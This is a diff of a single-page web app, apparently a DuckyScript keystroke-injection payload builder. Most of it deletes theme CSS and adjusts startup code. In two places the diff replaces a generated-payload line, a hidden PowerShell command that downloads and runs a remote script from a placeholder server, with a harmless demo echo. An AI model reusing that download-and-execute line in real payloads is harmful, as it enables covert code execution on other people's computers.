@@ -10,6 +10,8 @@
     href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&family=Share+Tech+Mono&display=swap"
     rel="stylesheet">
   <link href="https://fonts.googleapis.com/css2?family=Palatino+Linotype:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="./css/base.css">
+  <link rel="stylesheet" href="./css/forge-fixes.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
@@ -200,7 +202,7 @@ ENTER
 DELAY 1000
 GUI r
 DELAY 300
-STRING powershell -NoP -NonI -W Hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://yourserver.com/payload.ps1')"
+STRING powershell -c "Write-Host Demo"
 ENTER
 `: i.includes("system info") || i.includes("recon") || i.includes("gathering") ? r += `REM Gathering host information
 DELAY 1000
@@ -520,7 +522,7 @@ ENTER
 DELAY 1000
 GUI r
 DELAY 300
-STRING powershell -NoP -NonI -W Hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://yourserver.com/payload.ps1')"
+STRING powershell -c "Write-Host Demo"
 ENTER
 `: i.includes("system info") || i.includes("recon") || i.includes("gathering") ? r += `REM Gathering host information
 DELAY 1000
@@ -562,7 +564,7 @@ ${r}`, "ai"); return
 `) + 2), lintSource(document.getElementById("srcEditor").value), updateEditorCounts(), B("compiler", document.querySelector("[data-view=compiler]")), toast("Imported to IDE", "ok")
           }); const l = s.querySelector(".btn-copy"); l && l.addEventListener("click", () => { navigator.clipboard.writeText(e).then(() => toast("Copied to clipboard", "ok")).catch(() => toast("Copy block by browser", "err")) }); const i = s.querySelector(".btn-download"); i && i.addEventListener("click", () => { downloadTxt(e, "payload.ds") })
         } o.appendChild(s), o.scrollTop = o.scrollHeight
-      } function Ke() { var e, n; (n = (e = document.getElementById("chatMessages")) == null ? void 0 : e.querySelector('[data-extra="thinking"]')) == null || n.remove() } function Io() { document.getElementById("chatMessages").innerHTML = "", c.chatHistory = [] } let de = !1; function vo() { var s; const e = document.getElementById("micBtn"), n = document.getElementById("micStatus"), t = document.getElementById("micWave"); if (!("webkitSpeechRecognition" in window || "SpeechRecognition" in window)) { toast("Speech recognition not supported", "err"); return } if (de) { de = !1, (s = c.recognition) == null || s.stop(), e.style.borderColor = "var(--g)", e.style.background = "var(--g-dark)", n.textContent = "Click to start dictation", t && t.classList.remove("active"); return } de = !0, e.style.borderColor = "var(--red)", e.style.background = "rgba(255,45,85,.15)", n.textContent = "Listening…", t && t.classList.add("active"); const o = window.SpeechRecognition || window.webkitSpeechRecognition; c.recognition = new o, c.recognition.continuous = !0, c.recognition.onresult = a => { const d = a.results[a.results.length - 1][0].transcript; document.getElementById("micOutput").textContent += d + " " }, c.recognition.onend = () => { de = !1, e.style.borderColor = "var(--g)", e.style.background = "var(--g-dark)", n.textContent = "Click to start dictation", t && t.classList.remove("active") }, c.recognition.start() } function Co() { var n, t; const e = (t = (n = document.getElementById("micOutput")) == null ? void 0 : n.textContent) == null ? void 0 : t.trim(); e && (document.getElementById("chatInput").value = e, pt()) } window.addEventListener("DOMContentLoaded", () => { var e, n; dt(), localStorage.getItem("lenlu_booted4") === "1" && ((e = document.getElementById("splash")) == null || e.classList.add("hidden"), (n = document.getElementById("app")) == null || n.classList.add("visible"), oe()) }); const bo = oe; oe = async function () { await bo(), loadTheme(), loadLayout(), drawSpeedGauge(0), setInterval(updateSkeuNeedles, 500), initArchitectCanvas(), runSubnetCalc(), renderMitreGrid(), runComplianceAudit() }; window.runBoot = dt; window.bootEnter = Eo; window.initApp = oe; window.switchView = B; window.initRevealObserver = ut; window.buildAITags = mt; window.setAIPreset = So; window.sendChat = pt; window.clearChat = Io; window.toggleMic = vo; window.sendMicToChat = Co;</script>
+      } function Ke() { var e, n; (n = (e = document.getElementById("chatMessages")) == null ? void 0 : e.querySelector('[data-extra="thinking"]')) == null || n.remove() } function Io() { document.getElementById("chatMessages").innerHTML = "", c.chatHistory = [] } let de = !1; function vo() { var s; const e = document.getElementById("micBtn"), n = document.getElementById("micStatus"), t = document.getElementById("micWave"); if (!("webkitSpeechRecognition" in window || "SpeechRecognition" in window)) { toast("Speech recognition not supported", "err"); return } if (de) { de = !1, (s = c.recognition) == null || s.stop(), e.style.borderColor = "var(--g)", e.style.background = "var(--g-dark)", n.textContent = "Click to start dictation", t && t.classList.remove("active"); return } de = !0, e.style.borderColor = "var(--red)", e.style.background = "rgba(255,45,85,.15)", n.textContent = "Listening…", t && t.classList.add("active"); const o = window.SpeechRecognition || window.webkitSpeechRecognition; c.recognition = new o, c.recognition.continuous = !0, c.recognition.onresult = a => { const d = a.results[a.results.length - 1][0].transcript; document.getElementById("micOutput").textContent += d + " " }, c.recognition.onend = () => { de = !1, e.style.borderColor = "var(--g)", e.style.background = "var(--g-dark)", n.textContent = "Click to start dictation", t && t.classList.remove("active") }, c.recognition.start() } function Co() { var n, t; const e = (t = (n = document.getElementById("micOutput")) == null ? void 0 : n.textContent) == null ? void 0 : t.trim(); e && (document.getElementById("chatInput").value = e, pt()) } window.addEventListener("DOMContentLoaded", () => { var e, n; dt(), localStorage.getItem("lenlu_booted4") === "1" && ((e = document.getElementById("splash")) == null || e.classList.add("hidden"), (n = document.getElementById("app")) == null || n.classList.add("visible"), oe()) }); const bo = oe; oe = async function () { await bo(), drawSpeedGauge(0), initArchitectCanvas(), runSubnetCalc(), renderMitreGrid(), runComplianceAudit() }; window.runBoot = dt; window.bootEnter = Eo; window.initApp = oe; window.switchView = B; window.initRevealObserver = ut; window.buildAITags = mt; window.setAIPreset = So; window.sendChat = pt; window.clearChat = Io; window.toggleMic = vo; window.sendMicToChat = Co;</script>
   <!-- ===== INLINED CSS: base.css, layout-skeu.css, skeu.css, forge-fixes.css ===== -->
   <style>
     /* ========== BASE.CSS ========== */
@@ -3497,20 +3499,6 @@ ${r}`, "ai"); return
       display: none !important;
     }
 
-    [data-theme="skeu"] .cyber-only {
-      display: none !important;
-    }
-
-    [data-theme="skeu"] .skeu-only {
-      display: block !important;
-    }
-
-    [data-theme="skeu"] span.skeu-only,
-    [data-theme="skeu"] p.skeu-only,
-    [data-theme="skeu"] em.skeu-only {
-      display: inline !important;
-    }
-
     /* ─── UTILITIES ────────────────────────────────────── */
 
     .flex {
@@ -3692,18 +3680,6 @@ ${r}`, "ai"); return
       color: #001a08;
     }
 
-    [data-theme="skeu"] .tool-tab-btn:hover {
-      color: var(--s-brass);
-      border-color: rgba(200, 146, 42, 0.2);
-      background: rgba(200, 146, 42, 0.05);
-    }
-
-    [data-theme="skeu"] .tool-tab-btn.active {
-      color: #fff;
-      background: linear-gradient(180deg, #7d5a3c, #5c3d1e);
-      border-color: var(--s-brass);
-    }
-
     /* ─── MANUAL INFO BUTTONS ─────────────────────────── */
     .manual-btn {
       width: 26px;
@@ -3732,17 +3708,7 @@ ${r}`, "ai"); return
       font-size: 0.72rem;
     }
 
-    [data-theme="skeu"] .manual-btn {
-      border-color: rgba(200, 146, 42, 0.3);
-      background: rgba(200, 146, 42, 0.08);
-      color: var(--s-brass);
-    }
 
-    [data-theme="skeu"] .manual-btn:hover {
-      border-color: var(--s-brass);
-      background: rgba(200, 146, 42, 0.2);
-      color: #fff;
-    }
 
     /* ─── FLOATING CHATBOT ────────────────────────────── */
     #floating-chatbot-trigger:hover {
@@ -3786,571 +3752,7 @@ ${r}`, "ai"); return
       background: rgba(8, 247, 254, 0.04);
       border: 1px solid rgba(8, 247, 254, 0.25);
       color: var(--white);
-    }
 
-    [data-theme="skeu"] #floating-chatbot-trigger {
-      background: linear-gradient(135deg, #a67c52, #7d5a3c);
-      border-color: var(--s-brass);
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
-    }
-
-    [data-theme="skeu"] #floating-chatbot-trigger:hover {
-      box-shadow: 0 0 30px rgba(200, 146, 42, 0.5);
-    }
-
-    [data-theme="skeu"] .msg.ai .msg-bubble {
-      background: rgba(200, 146, 42, 0.06);
-      border-color: rgba(200, 146, 42, 0.25);
-    }
-
-    [data-theme="skeu"] .msg.user .msg-bubble {
-      background: rgba(140, 155, 171, 0.08);
-      border-color: rgba(140, 155, 171, 0.3);
-    }
-
-    /* ========== LAYOUT-SKEU.CSS ========== */
-    /* ==========================================================================
-   LAYOUT ENGINE ENHANCED — CYBER VS SKEUOMORPHIC ARRANGEMENT
-   Improved: grid systems, dashboard layout, card polish, gauges
-   ========================================================================== */
-
-    /* ─── TOGGLE BARS ──────────────────────────────────── */
-
-    .layout-toggle-bar {
-      display: flex;
-      align-items: center;
-      gap: .55rem;
-      padding: .38rem .75rem;
-      background: rgba(0, 0, 0, .3);
-      border: 1px solid rgba(255, 255, 255, .07);
-      border-radius: 20px;
-      cursor: pointer;
-      transition: all .25s;
-      flex-shrink: 0;
-    }
-
-    .layout-toggle-bar:hover {
-      background: rgba(255, 255, 255, .06);
-      border-color: rgba(255, 255, 255, .15);
-    }
-
-    [data-theme="cyber"] .layout-toggle-bar {
-      border-color: rgba(0, 255, 65, .2);
-    }
-
-    [data-theme="cyber"] .layout-toggle-bar:hover {
-      border-color: rgba(0, 255, 65, .4);
-      background: rgba(0, 255, 65, .05);
-    }
-
-    /* ─── SKEU LAYOUT: DESK SURFACE ────────────────────── */
-
-    /* Skeu Theme + Skeu Layout — Mahogany desk surface */
-    [data-layout="skeu"][data-theme="skeu"] .main {
-      background:
-        #2a1a0e radial-gradient(ellipse at 50% 20%, #3d2512 0%, #120904 80%) !important;
-      border: 14px solid #3d2810 !important;
-      box-shadow:
-        inset 0 0 60px rgba(0, 0, 0, .95),
-        inset 0 2px 8px rgba(255, 220, 150, .04),
-        0 10px 30px rgba(0, 0, 0, .85) !important;
-      position: relative;
-    }
-
-    /* Cyber Theme + Skeu Layout — Gunmetal cockpit console */
-    [data-layout="skeu"][data-theme="cyber"] .main {
-      background:
-        #121714 radial-gradient(ellipse at 50% 20%, #1c2620 0%, #060a08 80%) !important;
-      border: 14px solid #1a221d !important;
-      box-shadow:
-        inset 0 0 60px rgba(0, 0, 0, .95),
-        inset 0 2px 8px rgba(0, 255, 65, .03),
-        0 10px 30px rgba(0, 0, 0, .85) !important;
-      position: relative;
-    }
-
-    @media(max-width: 768px) {
-      [data-layout="skeu"] .main {
-        border: 5px solid #3d2810 !important;
-        padding: .6rem !important;
-      }
-
-      [data-layout="skeu"][data-theme="cyber"] .main {
-        border: 5px solid #1a221d !important;
-        padding: .6rem !important;
-      }
-    }
-
-    /* ─── SKEU LAYOUT: GRID OVERRIDES ─────────────────── */
-
-    [data-layout="skeu"] .g2 {
-      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)) !important;
-      gap: 1.6rem !important;
-    }
-
-    [data-layout="skeu"] .g3 {
-      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)) !important;
-      gap: 1.6rem !important;
-    }
-
-    [data-layout="skeu"] .g4 {
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)) !important;
-      gap: 1.3rem !important;
-    }
-
-    [data-layout="skeu"] .g-ide {
-      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)) !important;
-      gap: 1.6rem !important;
-    }
-
-    [data-layout="skeu"] .g-ai {
-      grid-template-columns: repeat(auto-fit, minmax(290px, 1fr)) !important;
-      gap: 1.6rem !important;
-    }
-
-    /* ─── SKEU LAYOUT: DASHBOARD ARRANGEMENT ──────────── */
-
-    @media(min-width: 961px) {
-
-      [data-layout="skeu"] #view-dashboard.active {
-        display: grid !important;
-        grid-template-columns: repeat(12, 1fr) !important;
-        gap: 1.6rem !important;
-      }
-
-      [data-layout="skeu"] #view-dashboard.active .hero-banner {
-        grid-column: span 12 !important;
-      }
-
-      [data-layout="skeu"] #view-dashboard.active .stat-row {
-        grid-column: span 12 !important;
-      }
-
-      [data-layout="skeu"] #view-dashboard.active .g3,
-      [data-layout="skeu"] #view-dashboard.active .g2 {
-        display: contents !important;
-      }
-
-      /* Left column: Threat Matrix */
-      [data-layout="skeu"] #view-dashboard.active .card-holo {
-        grid-column: span 3 !important;
-        grid-row: 3 / 4 !important;
-      }
-
-      [data-layout="skeu"] #view-dashboard.active .g3>.card:nth-child(2) {
-        grid-column: span 3 !important;
-        grid-row: 4 / 5 !important;
-      }
-
-      /* Center column: Compile + Activity */
-      [data-layout="skeu"] #view-dashboard.active .g3>.card:nth-child(1) {
-        grid-column: span 5 !important;
-        grid-row: 3 / 4 !important;
-      }
-
-      [data-layout="skeu"] #view-dashboard.active .g2>.card:nth-child(2) {
-        grid-column: span 5 !important;
-        grid-row: 4 / 5 !important;
-      }
-
-      /* Right column: Telemetry (spans rows) */
-      [data-layout="skeu"] #view-dashboard.active .g3>.card:nth-child(3) {
-        grid-column: span 4 !important;
-        grid-row: 3 / 5 !important;
-      }
-
-      /* Full-width bottom: DuckyScript Reference */
-      [data-layout="skeu"] #view-dashboard.active .g2>.card:nth-child(1) {
-        grid-column: span 12 !important;
-        grid-row: 5 / 6 !important;
-      }
-    }
-
-    /* ─── SKEU LAYOUT: CARD FRAMES ─────────────────────── */
-
-    [data-layout="skeu"] .card,
-    [data-layout="skeu"] .exe-builder,
-    [data-layout="skeu"] .editor-wrap,
-    [data-layout="skeu"] .scan-card {
-      border-radius: 8px !important;
-      padding: 1.4rem !important;
-      position: relative;
-      overflow: visible !important;
-    }
-
-    /* SKEU THEME + SKEU LAYOUT: Mahogany plate with gold screws */
-    [data-layout="skeu"][data-theme="skeu"] .card,
-    [data-layout="skeu"][data-theme="skeu"] .exe-builder,
-    [data-layout="skeu"][data-theme="skeu"] .editor-wrap,
-    [data-layout="skeu"][data-theme="skeu"] .scan-card {
-      background:
-        radial-gradient(circle at 10px 10px, #f5d070 1.5px, #c8922a 3.5px, #3a2212 4.5px, transparent 5.5px),
-        radial-gradient(circle at calc(100% - 10px) 10px, #f5d070 1.5px, #c8922a 3.5px, #3a2212 4.5px, transparent 5.5px),
-        radial-gradient(circle at 10px calc(100% - 10px), #f5d070 1.5px, #c8922a 3.5px, #3a2212 4.5px, transparent 5.5px),
-        radial-gradient(circle at calc(100% - 10px) calc(100% - 10px), #f5d070 1.5px, #c8922a 3.5px, #3a2212 4.5px, transparent 5.5px),
-        linear-gradient(135deg, #2e1c0c 0%, #1f1206 50%, #291a0c 100%) !important;
-      border: 3px solid #8b5a0f !important;
-      box-shadow:
-        0 12px 30px rgba(0, 0, 0, .8),
-        inset 0 1px 0 rgba(255, 220, 150, .15),
-        inset 0 -1px 0 rgba(0, 0, 0, .4) !important;
-    }
-
-    /* CYBER THEME + SKEU LAYOUT: Gunmetal carbon plate with chrome screws */
-    [data-layout="skeu"][data-theme="cyber"] .card,
-    [data-layout="skeu"][data-theme="cyber"] .exe-builder,
-    [data-layout="skeu"][data-theme="cyber"] .editor-wrap,
-    [data-layout="skeu"][data-theme="cyber"] .scan-card {
-      background:
-        radial-gradient(circle at 10px 10px, #fff 1.5px, #888 3.5px, #1a221d 4.5px, transparent 5.5px),
-        radial-gradient(circle at calc(100% - 10px) 10px, #fff 1.5px, #888 3.5px, #1a221d 4.5px, transparent 5.5px),
-        radial-gradient(circle at 10px calc(100% - 10px), #fff 1.5px, #888 3.5px, #1a221d 4.5px, transparent 5.5px),
-        radial-gradient(circle at calc(100% - 10px) calc(100% - 10px), #fff 1.5px, #888 3.5px, #1a221d 4.5px, transparent 5.5px),
-        linear-gradient(135deg, #161c18 0%, #0d120f 50%, #080c09 100%) !important;
-      border: 3px solid var(--g-dim) !important;
-      box-shadow:
-        0 12px 30px rgba(0, 0, 0, .8),
-        0 0 14px rgba(0, 255, 65, .15),
-        inset 0 1px 0 rgba(0, 255, 65, .08),
-        inset 0 -1px 0 rgba(0, 0, 0, .4) !important;
-    }
-
-    /* ─── SKEU LAYOUT: CARD HEADERS ────────────────────── */
-
-    [data-layout="skeu"] .card-header,
-    [data-layout="skeu"] .editor-bar {
-      padding: .7rem 1.15rem !important;
-      border-radius: 5px 5px 0 0 !important;
-      box-shadow:
-        inset 0 1px 0 rgba(255, 255, 255, .15),
-        0 2px 4px rgba(0, 0, 0, .15) !important;
-    }
-
-    [data-layout="skeu"][data-theme="skeu"] .card-header,
-    [data-layout="skeu"][data-theme="skeu"] .editor-bar {
-      border-bottom: 2px solid #5c3d1e !important;
-      background: linear-gradient(180deg, #c8922a 0%, #a87020 100%) !important;
-      color: #0f0702 !important;
-      font-family: 'Palatino Linotype', serif !important;
-      text-shadow: 0 1px 0 rgba(255, 255, 255, .3) !important;
-    }
-
-    [data-layout="skeu"][data-theme="cyber"] .card-header,
-    [data-layout="skeu"][data-theme="cyber"] .editor-bar {
-      border-bottom: 2px solid var(--g-dim) !important;
-      background: linear-gradient(180deg, #222b25 0%, #111813 100%) !important;
-      color: var(--g) !important;
-      font-family: var(--font-display) !important;
-      text-shadow: 0 0 5px rgba(0, 255, 65, .5) !important;
-    }
-
-    /* ─── GAUGE CONTAINERS ─────────────────────────────── */
-
-    .gauge-container {
-      width: 95px;
-      height: 52px;
-      margin: 0 auto 5px;
-      position: relative;
-      display: none;
-      overflow: hidden;
-      border-radius: 4px 4px 0 0;
-    }
-
-    [data-layout="skeu"] .gauge-container {
-      display: block;
-    }
-
-    .gauge-dial {
-      width: 100%;
-      height: 90px;
-      border-radius: 50%;
-      position: relative;
-    }
-
-    /* Parchment gauge face for Skeu theme */
-    [data-theme="skeu"] .gauge-dial {
-      background: radial-gradient(circle at 50% 50%, #fffdd0 35%, #eedfa2 75%, #c8922a 100%);
-      border: 2px solid #5c3d1e;
-      box-shadow: inset 0 2px 5px rgba(0, 0, 0, .5);
-    }
-
-    [data-theme="skeu"] .gauge-dial::before {
-      content: '';
-      position: absolute;
-      top: 8px;
-      left: 12px;
-      right: 12px;
-      height: 35px;
-      border-top: 1.5px dashed rgba(139, 26, 26, .45);
-      border-radius: 50%;
-    }
-
-    [data-theme="skeu"] .gauge-needle {
-      width: 1.5px;
-      height: 40px;
-      background: #8b1a1a;
-      position: absolute;
-      bottom: 50%;
-      left: calc(50% - 0.75px);
-      transform-origin: bottom center;
-      transform: rotate(-60deg);
-      transition: transform .8s cubic-bezier(.25, .8, .25, 1.25);
-      z-index: 3;
-      box-shadow: .5px 0 1px rgba(0, 0, 0, .4);
-    }
-
-    /* Gunmetal gauge face for Cyber theme */
-    [data-theme="cyber"] .gauge-dial {
-      background: radial-gradient(circle at 50% 50%, #1a2a1d 35%, #0d160f 75%, #060c08 100%);
-      border: 2px solid var(--g-dim);
-      box-shadow: inset 0 2px 5px rgba(0, 0, 0, .8), 0 0 8px rgba(0, 255, 65, .1);
-    }
-
-    [data-theme="cyber"] .gauge-dial::before {
-      content: '';
-      position: absolute;
-      top: 8px;
-      left: 12px;
-      right: 12px;
-      height: 35px;
-      border-top: 1px dashed rgba(0, 255, 65, .25);
-      border-radius: 50%;
-    }
-
-    [data-theme="cyber"] .gauge-needle {
-      width: 1.5px;
-      height: 40px;
-      background: var(--g);
-      position: absolute;
-      bottom: 50%;
-      left: calc(50% - 0.75px);
-      transform-origin: bottom center;
-      transform: rotate(-60deg);
-      transition: transform .8s cubic-bezier(.25, .8, .25, 1.25);
-      z-index: 3;
-      box-shadow: 0 0 4px rgba(0, 255, 65, .6);
-    }
-
-    .gauge-pivot {
-      position: absolute;
-      bottom: 50%;
-      left: 50%;
-      transform: translate(-50%, 50%);
-      width: 6px;
-      height: 6px;
-      border-radius: 50%;
-      z-index: 4;
-    }
-
-    [data-theme="skeu"] .gauge-pivot {
-      background: radial-gradient(circle at 40% 40%, #e0e0e0, #888);
-      border: 1px solid #555;
-    }
-
-    [data-theme="cyber"] .gauge-pivot {
-      background: var(--g);
-      box-shadow: 0 0 6px var(--g);
-    }
-
-    /* ─── VACUUM TUBES ─────────────────────────────────── */
-
-    .tube-row {
-      display: flex;
-      gap: 8px;
-      justify-content: center;
-      margin-top: 8px;
-    }
-
-    .vacuum-tube {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      gap: 4px;
-      position: relative;
-    }
-
-    [data-layout="skeu"] .vacuum-tube {
-      display: flex;
-    }
-
-    .tube-glass {
-      width: 22px;
-      height: 42px;
-      border-radius: 11px 11px 4px 4px;
-      position: relative;
-      overflow: hidden;
-    }
-
-    [data-theme="skeu"] .tube-glass {
-      background:
-        radial-gradient(ellipse at 40% 30%, rgba(255, 255, 220, .9) 0%, rgba(255, 240, 160, .6) 30%, rgba(180, 140, 60, .4) 70%, rgba(100, 60, 20, .6) 100%);
-      border: 1px solid rgba(180, 140, 60, .7);
-      box-shadow: inset 2px 0 4px rgba(255, 255, 200, .3), inset -2px 0 4px rgba(0, 0, 0, .3);
-    }
-
-    [data-theme="cyber"] .tube-glass {
-      background:
-        radial-gradient(ellipse at 40% 30%, rgba(0, 255, 65, .2) 0%, rgba(0, 200, 50, .1) 40%, rgba(0, 50, 15, .3) 70%, rgba(0, 0, 0, .8) 100%);
-      border: 1px solid rgba(0, 255, 65, .3);
-      box-shadow: inset 0 0 8px rgba(0, 255, 65, .15);
-    }
-
-    .tube-filament {
-      position: absolute;
-      left: 50%;
-      top: 10px;
-      width: 2px;
-      height: 24px;
-      transform: translateX(-50%);
-      border-radius: 1px;
-      transition: all .6s ease;
-    }
-
-    [data-theme="skeu"] .tube-filament {
-      background: linear-gradient(180deg, #ff9900, #ffcc00, #ff9900);
-      box-shadow: 0 0 6px rgba(255, 180, 0, .7);
-    }
-
-    [data-theme="cyber"] .tube-filament {
-      background: linear-gradient(180deg, var(--g-dim), var(--g), var(--g-dim));
-      box-shadow: 0 0 6px rgba(0, 255, 65, .5);
-    }
-
-    .tube-base {
-      width: 22px;
-      height: 6px;
-      border-radius: 0 0 3px 3px;
-    }
-
-    [data-theme="skeu"] .tube-base {
-      background: linear-gradient(180deg, #5c3d1e, #2a1a0e);
-      border: 1px solid #8b5a0f;
-    }
-
-    [data-theme="cyber"] .tube-base {
-      background: linear-gradient(180deg, #1a2a1d, #0d1610);
-      border: 1px solid var(--g-dim);
-    }
-
-    .tube-label {
-      font-size: .48rem;
-      letter-spacing: .08em;
-    }
-
-    [data-theme="skeu"] .tube-label {
-      font-family: 'Palatino Linotype', serif;
-      color: var(--s-muted);
-    }
-
-    [data-theme="cyber"] .tube-label {
-      font-family: var(--font-hud);
-      color: var(--g-dim);
-    }
-
-    /* ─── SPEEDOMETER ──────────────────────────────────── */
-
-    .speedo-wrap {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      margin-bottom: 8px;
-    }
-
-    [data-layout="skeu"] .speedo-wrap {
-      display: flex;
-    }
-
-    .speedo-arc {
-      width: 110px;
-      height: 60px;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .speedo-dial {
-      width: 110px;
-      height: 110px;
-      border-radius: 50%;
-      position: absolute;
-      top: 0;
-      left: 0;
-    }
-
-    [data-theme="skeu"] .speedo-dial {
-      background: radial-gradient(circle at 50% 100%, #fffdd0 30%, #eedfa2 65%, #c8922a 100%);
-      border: 2px solid #5c3d1e;
-      box-shadow: inset 0 2px 6px rgba(0, 0, 0, .5);
-    }
-
-    [data-theme="cyber"] .speedo-dial {
-      background: radial-gradient(circle at 50% 100%, #0d1610 30%, #0a1a0c 65%, #050c07 100%);
-      border: 2px solid var(--g-dim);
-      box-shadow: inset 0 2px 6px rgba(0, 0, 0, .8), 0 0 10px rgba(0, 255, 65, .1);
-    }
-
-    .speedo-needle {
-      width: 2px;
-      height: 45px;
-      position: absolute;
-      bottom: 0;
-      left: calc(50% - 1px);
-      transform-origin: bottom center;
-      transform: rotate(-90deg);
-      transition: transform 1s cubic-bezier(.25, .8, .25, 1.25);
-      z-index: 3;
-    }
-
-    [data-theme="skeu"] .speedo-needle {
-      background: linear-gradient(0deg, #8b1a1a 60%, rgba(139, 26, 26, .3) 100%);
-      box-shadow: .5px 0 2px rgba(0, 0, 0, .4);
-    }
-
-    [data-theme="cyber"] .speedo-needle {
-      background: linear-gradient(0deg, var(--g) 60%, rgba(0, 255, 65, .2) 100%);
-      box-shadow: 0 0 6px rgba(0, 255, 65, .5);
-    }
-
-    .speed-val {
-      font-size: 1.4rem;
-      font-weight: 700;
-      line-height: 1;
-      margin-top: 4px;
-    }
-
-    [data-theme="skeu"] .speed-val {
-      font-family: 'Palatino Linotype', serif;
-      color: var(--s-brass2);
-    }
-
-    [data-theme="cyber"] .speed-val {
-      font-family: var(--font-display);
-      color: var(--g);
-      text-shadow: 0 0 12px rgba(0, 255, 65, .5);
-    }
-
-    .speed-unit {
-      font-family: var(--font-hud);
-      font-size: .58rem;
-      color: var(--muted);
-      letter-spacing: .1em;
-    }
-
-    [data-theme="skeu"] .speed-unit {
-      font-family: 'Courier New', monospace;
-      color: var(--s-muted);
-    }
-
-    /* ─── SKEU HOME HERO ───────────────────────────────── */
-
-    [data-theme="skeu"] #view-home .hb-title,
-    [data-theme="skeu"] #view-home [style*="font-family:var(--font-display)"] {
-      font-family: 'Palatino Linotype', 'Book Antiqua', serif !important;
-      animation: none !important;
-    }
-
-    /* ─── COMPILER TABS — SKEU ─────────────────────────── */
-
-    [data-theme="skeu"] .compiler-tab {
       font-family: 'Palatino Linotype', serif !important;
       background: linear-gradient(180deg, #2e1c0c 0%, #1f1208 100%) !important;
       border: 1px solid rgba(200, 146, 42, .3) !important;
@@ -5907,173 +5309,6 @@ ${r}`, "ai"); return
       font-size: 0.58rem !important;
       line-height: 1 !important;
       margin-top: 1px !important;
-    }
-
-    /* Function key row - slightly shorter */
-    .kb-row.fn-row .key {
-      height: 30px !important;
-      font-size: 0.52rem !important;
-      min-width: 36px !important;
-    }
-
-    /* Number row keys */
-    .kb-row.num-row .key {
-      min-width: 36px !important;
-    }
-
-    /* Spacebar row */
-    .kb-row.space-row .key {
-      height: 38px !important;
-    }
-
-    /* Mobile keyboard: scale down */
-    @media (max-width: 860px) {
-      .keyboard-container {
-        padding: 10px 8px !important;
-        max-width: 100% !important;
-      }
-
-      .key,
-      .vkey {
-        height: 32px !important;
-        min-width: 28px !important;
-        font-size: 0.5rem !important;
-        padding: 0 4px !important;
-      }
-
-      .kb-row.fn-row .key {
-        height: 26px !important;
-        min-width: 28px !important;
-      }
-
-      .key.w2 {
-        min-width: 50px !important;
-      }
-
-      .key.w3 {
-        min-width: 70px !important;
-      }
-
-      .key.w4 {
-        min-width: 84px !important;
-      }
-
-      .key.w6 {
-        min-width: 160px !important;
-      }
-
-      .kb-row {
-        gap: 2px !important;
-        margin-bottom: 2px !important;
-      }
-    }
-
-    @media (max-width: 540px) {
-      .keyboard-container {
-        padding: 8px 6px !important;
-        border-radius: 8px !important;
-      }
-
-      .key,
-      .vkey {
-        height: 28px !important;
-        min-width: 24px !important;
-        font-size: 0.44rem !important;
-        padding: 0 3px !important;
-      }
-
-      .key.w2 {
-        min-width: 44px !important;
-      }
-
-      .key.w3 {
-        min-width: 60px !important;
-      }
-
-      .key.w4 {
-        min-width: 72px !important;
-      }
-
-      .key.w6 {
-        min-width: 120px !important;
-      }
-    }
-
-
-    /* ╔══════════════════════════════════════════════════════════╗
-   ║  4. SKEUOMORPHIC THEME — COMPLETELY DIFFERENT LAYOUT     ║
-   ╚══════════════════════════════════════════════════════════╝ */
-
-    /* ── Skeu: Body & Background ───────────────────────────────── */
-    [data-theme="skeu"] body {
-      background:
-        radial-gradient(ellipse 140% 80% at 20% 10%, rgba(200, 146, 42, .06) 0%, transparent 45%),
-        radial-gradient(ellipse 100% 60% at 80% 90%, rgba(92, 61, 30, .08) 0%, transparent 40%),
-        linear-gradient(155deg, #1c1208 0%, #0f0a04 35%, #18100a 65%, #0c0804 100%);
-      color: #ede5d0;
-      font-family: 'Georgia', 'Palatino Linotype', serif;
-    }
-
-    /* ── Skeu: MAIN CONTENT AREA ─────────────────────────────── */
-    [data-theme="skeu"] .main {
-      background:
-        url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60'%3E%3Cpath d='M0 0h60v60H0z' fill='none'/%3E%3Cpath d='M30 30m-1 0a1 1 0 1 0 2 0 1 1 0 1 0-2 0' fill='rgba(200%2C146%2C42%2C.025)'/%3E%3C/svg%3E"),
-        linear-gradient(180deg, rgba(18, 10, 5, .0) 0%, rgba(0, 0, 0, .1) 100%) !important;
-      padding: clamp(1rem, 2vw, 1.8rem) !important;
-    }
-
-    /* ── Skeu: LAYOUT SYSTEM — Asymmetric, Layered ──────────── */
-
-    /* Home view — stacked journal-style layout */
-    [data-theme="skeu"] #view-home {
-      gap: 2rem !important;
-    }
-
-    /* Home hero — aged paper parchment style */
-    [data-theme="skeu"] #view-home>div:first-child {
-      background:
-        radial-gradient(ellipse 60% 70% at 40% 50%, rgba(200, 146, 42, .04) 0%, transparent 60%),
-        linear-gradient(160deg, #231508 0%, #190f06 60%, #1f1308 100%) !important;
-      border: 2px solid rgba(200, 146, 42, .25) !important;
-      border-radius: 16px !important;
-      position: relative !important;
-      overflow: hidden !important;
-    }
-
-    /* Skeu home: decorative corner brackets */
-    [data-theme="skeu"] #view-home>div:first-child::before {
-      content: '' !important;
-      position: absolute !important;
-      inset: 8px !important;
-      border: 1px solid rgba(200, 146, 42, .1) !important;
-      border-radius: 10px !important;
-      pointer-events: none !important;
-      z-index: 0 !important;
-    }
-
-    /* Skeu: 9-card grid — masonry-like 2-column magazine layout on desktop */
-    [data-theme="skeu"] #view-home .g3 {
-      display: grid !important;
-      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)) !important;
-      gap: 1.8rem !important;
